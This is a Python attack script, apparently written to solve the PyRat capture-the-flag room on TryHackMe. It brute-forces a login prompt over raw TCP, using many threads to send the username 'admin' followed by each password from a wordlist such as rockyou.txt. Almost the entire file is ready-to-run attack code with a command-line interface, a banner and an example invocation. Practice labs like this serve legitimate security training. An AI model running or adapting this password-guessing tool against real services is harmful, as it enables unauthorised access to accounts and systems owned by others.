#!/usr/bin/python3 

##########################################################################################
# Title: Password Brute-Force Script for PyRat Room on TryHackMe                         #
# Description:                                                                           #
# ------------                                                                           #  
# The script is written by PkTheHacker10.                                                #
# It uses threading to brute-force password to speed up the process.                     #
# You can use --help to see the usage of the script.                                     #   
##########################################################################################

import socket
import argparse
from threading import Event
from concurrent.futures import ThreadPoolExecutor, as_completed

class pass_brute:
    # Class to handle password brute-force.
    def __init__(self, args, stop_event):
        self.target = args.target
        self.port = args.port
        self.wordlist = args.wordlist
        self.threads = int(args.threads)
        self.stop_event = stop_event  # Store stop_event in class

    def connect(self):
        # Function to connect to the target.
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target, self.port))
            return sock
        
        except TimeoutError:
            print("[ + ] Connection Error: Couldn't connect to the target")
            exit(0)
            
        except socket.gaierror as sgE:
            print(f"[ + ] Error: {sgE}")
            exit(0)
        
        except Exception as e:
            print(f"[ + ] Error: {e}")
            exit(0)

    def passbrute(self, password):
        # Function to brute-force password.
        if self.stop_event.is_set():  # Stop brute-force if event is set
            return
        
        socket = self.connect()
        socket.send(f"admin\n".encode())
        connection_result = socket.recv(1024)

        if "Password:" in connection_result.decode():
            socket.send(f"{password}\n".encode())
            response = socket.recv(1024)

            if "Password:" not in response.decode():
                print(f"\n[ + ] Password Found: {password}")
                self.stop_event.set()  # Signal all threads to stop
                return password  # Return result

            else:
                socket.close()

    def passbrute_handler(self):
        # Function to handle password brute-force.
        socket = self.connect()
        socket.close()
        tasks = []

        try:
            with ThreadPoolExecutor(max_workers=self.threads) as Threads:
                try:
                    with open(self.wordlist, "r") as wordlist:
                        for password in wordlist:
                            if self.stop_event.is_set():  # Stop submitting if password is found
                                break
                            tasks.append(Threads.submit(self.passbrute, password.strip()))
                except FileNotFoundError:
                    print(f"[ + ] Wordlist not found: {self.wordlist}")
                    exit(0)
                    
                for task in as_completed(tasks):  # Wait for all tasks
                    if task.result() is not None:
                        break
                    else:
                        break
                    
                if not self.stop_event.is_set():
                    print("\n[ + ] Exiting")
                    print("[ + ] Password not found")
                        
                        
        except KeyboardInterrupt:
            print("\n[ + ] Exiting...")
            self.stop_event.set()
            exit(0)
            
        except Exception as e:
            print(f"[ + ] Error: {e}")
            exit(1)

    def start(self):
        self.passbrute_handler()

class cli:
    # Class to handle CLI.
    def banner(self,args):
        # Function to print banner.
        print("""
                                        ___.                 __          
            ___________    ______ ______ \\_ |_________ __ ___/  |_  ____  
            \\____ \\__  \\  /  ___//  ___/  | __ \\_  __ \\  |  \\   __\\/ __ \\ 
            |  |_> > __ \\_\\___ \\ \\___ \\   | \\_\\ \\  | \\/  |  /|  | \\  ___/ 
            |   __(____  /____  >____  >  |___  /__|  |____/ |__|  \\___  >
            |__|       \\/     \\/     \\/       \\/                       \\/ 
                """)
        print("						Author   : PkTheHacker10")
        print("-" * 75)
        if not args.help:
            print("Target   :",args.target)
            print("Port     :",args.port)
            print("Threads  :",args.threads)
            print("Wordlist :",args.wordlist)    
            print("-" * 75)
        
    def help(self):
        # Function to print help.
        print(" Options:-")
        print("----------------")
        print("     -t, --target   : Target IP Address  [ mandatory ]")
        print("     -p, --port     : Target Port        [ mandatory ]")
        print("     -w, --wordlist : Wordlist Path      [ mandatory ]")
        print("     -T, --threads  : Number of Threads  [ default=40]")
        print("     -h, --help     : Show Help")
        
        print("\nUsage    : python3 exploit.py -t <target> -p <port> -w <wordlist> -T <threads>")
        print("Example  : python3 exploit.py -t 10.10.10.10 -p 8000 -w /usr/share/wordlists/rockyou.txt -T 50 ")
        
        
    def argsparser(self):
        # Function to parse arguments.
        try:
            argsparser = argparse.ArgumentParser(add_help=False, usage=argparse.SUPPRESS, exit_on_error=False)
            argsparser.add_argument("-t", "--target")
            argsparser.add_argument("-p", "--port",type=int)
            argsparser.add_argument("-w", "--wordlist")
            argsparser.add_argument("-T", "--threads", default=40)
            argsparser.add_argument("-h", "--help", action="store_true")
            args = argsparser.parse_args()
            return args
        
        except argparse.ArgumentError:
            print("Usage : python3 exploit.py\nUse --help to see the usage of the script")
            exit(1) 
            
        except Exception as e:
            print(f"[ + ] Error: {e}")
            exit(1)

if __name__ == "__main__":
    # Initialaizing classes.
    stop_event = Event()
    cli = cli()
    args = cli.argsparser()
    cli.banner(args)
    
    if args.help:
        cli.help()
        exit(0)
        
    if args.target is None or args.port is None or args.wordlist is None:
        print("Usage : python3 exploit.py\nUse --help to see the usage of the script")
        exit(1)
        
    print("Starting Password BruteForce Attack...")
        
    password_bruteforce = pass_brute(args, stop_event)
    password_bruteforce.start()
